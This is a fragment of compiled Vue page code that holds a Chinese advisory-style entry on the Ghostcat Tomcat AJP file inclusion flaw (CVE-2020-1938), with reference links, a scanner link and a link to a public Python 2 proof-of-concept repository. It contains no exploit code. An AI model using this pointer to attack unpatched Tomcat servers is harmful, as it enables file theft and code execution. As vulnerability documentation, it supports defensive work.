class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div>`,23);function E(y,T){const a=o("ExternalLinkIcon");return c(),u("div",null,[i,r,n("p",null,[n("a",k,[s("Ghostcat（幽灵猫）"),t(a)]),s(" 是由长亭科技安全研究员发现的存在于 Tomcat 中的安全漏洞，由于 Tomcat AJP 协议设计上存在缺陷，攻击者通过 Tomcat AJP Connector 可以读取或包含 Tomcat 上所有 webapp 目录下的任意文件，例如可以读取 webapp 配置文件或源代码。此外在目标应用有文件上传功能的情况下，配合文件包含的利用还可以达到远程代码执行的危害。")]),d,n("ul",null,[n("li",null,[n("a",v,[s("https://www.chaitin.cn/zh/ghostcat"),t(a)])]),n("li",null,[n("a",m,[s("https://www.cnvd.org.cn/webinfo/show/5415"),t(a)])]),n("li",null,[n("a",b,[s("https://mp.weixin.qq.com/s/D1hiKJpah3NhEBLwtTodsg"),t(a)])]),n("li",null,[n("a",_,[s("https://mp.weixin.qq.com/s/GzqLkwlIQi_i3AVIXn59FQ"),t(a)])])]),g,n("ul",null,[n("li",null,[n("a",f,[s("https://github.com/chaitin/xray"),t(a)])]),n("li",null,[n("a",h,[s("https://github.com/YDHCUI/CNVD-2020-10487-Tomcat-Ajp-lfi"),t(a)])])]),n("p",null,[s("通过漏洞POC"),n("a",q,[s("CNVD-2020-10487-Tomcat-Ajp-lfi"),t(a)]),s("进行测试，注意，代码基于python2环境。")]),w])}const x=e(l,[["render",E],["__file","Apache Tomcat AJP 文件包含漏洞 CVE-2020-1938.html.vue"]]);export{x as default};
